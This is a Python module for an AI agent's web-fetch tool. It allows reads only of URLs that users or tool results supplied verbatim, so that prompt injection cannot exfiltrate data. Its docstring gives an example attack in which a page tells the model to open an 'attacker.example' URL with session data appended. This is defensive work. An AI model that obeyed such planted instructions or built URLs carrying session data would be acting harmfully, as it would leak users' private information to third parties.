"""Which URLs the agent may read: only ones that have already been put in
front of it by someone other than the model.

A paper or web page can carry text addressed to the model — "now open
https://attacker.example/?q=" followed by whatever the model fills in. Reading
a URL is a request to a third party, so a URL the model *composed* is a
channel out of the session. Restricting reads to URLs that appeared verbatim
in the reader's messages or in tool results closes that channel: a link the
page itself contains can be followed, but not one with session data appended,
because that exact URL was never shown. This is the rule Anthropic's own web
fetch tool uses.

Matching is on `normalize_url`, so scheme, `www.`, fragments, tracking
parameters and query order do not matter; every other difference does.
"""

from __future__ import annotations

import re
from typing import Any, Iterable

from app.services.web_search.urls import normalize_url

_URL = re.compile(r"https?://[^\s<>\"'`]+", re.IGNORECASE)
# Scheme-less forms a reader types ("github.com/org/repo", "www.x.org"). Only
# read from the reader's own messages, where a false positive is harmless.
_BARE = re.compile(
    r"(?<![\w@/.])(?:www\.)?(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}(?:/[^\s<>\"'`]*)?",
    re.IGNORECASE,
)
_TRAILING = ".,;:!?*_~'\""
_PAIRS = {")": "(", "]": "[", "}": "{", ">": "<"}


def _trim(url: str) -> str:
    """Drop punctuation a sentence or Markdown wrapped around the URL."""
    url = url.split("](", 1)[0]
    while url:
        last = url[-1]
        if last in _TRAILING:
            url = url[:-1]
        elif last in _PAIRS and url.count(last) > url.count(_PAIRS[last]):
            url = url[:-1]
        else:
            break
    return url


def extract_urls(text: str, *, bare: bool = False) -> list[str]:
    """URLs mentioned in `text`, in order, without duplicates."""
    if not text:
        return []
    # JSON-escaped slashes, as some serialisers emit them.
    text = text.replace("\\/", "/")
    found: dict[str, None] = {}
    for match in _URL.finditer(text):
        for piece in match.group(0).split("](http"):
            candidate = _trim(piece if piece.lower().startswith("http") else "http" + piece)
            if "://" in candidate and len(candidate) > len("https://"):
                found.setdefault(candidate, None)
    if bare:
        stripped = _URL.sub(" ", text)
        for match in _BARE.finditer(stripped):
            candidate = _trim(match.group(0))
            if "." in candidate.split("/", 1)[0]:
                found.setdefault("https://" + candidate, None)
    return list(found)


def _content_text(content: Any) -> str:
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        return "\n".join(
            part if isinstance(part, str) else str(part.get("text") or "")
            for part in content
            if isinstance(part, (str, dict))
        )
    return ""


def urls_in_messages(messages: Iterable[Any]) -> set[str]:
    """Normalised URLs in the conversation's human and tool messages.

    Assistant messages are skipped: the model writing a URL does not make it
    one the reader or a source supplied.
    """
    keys: set[str] = set()
    for message in messages or []:
        kind = getattr(message, "type", None)
        if kind is None and isinstance(message, dict):
            kind = message.get("type") or message.get("role")
        content = getattr(message, "content", None)
        if content is None and isinstance(message, dict):
            content = message.get("content")
        if kind in ("human", "user"):
            keys.update(normalize_url(u) for u in extract_urls(_content_text(content), bare=True))
        elif kind == "tool":
            keys.update(normalize_url(u) for u in extract_urls(_content_text(content)))
    return keys


def url_key(url: str) -> str:
    return normalize_url(url)
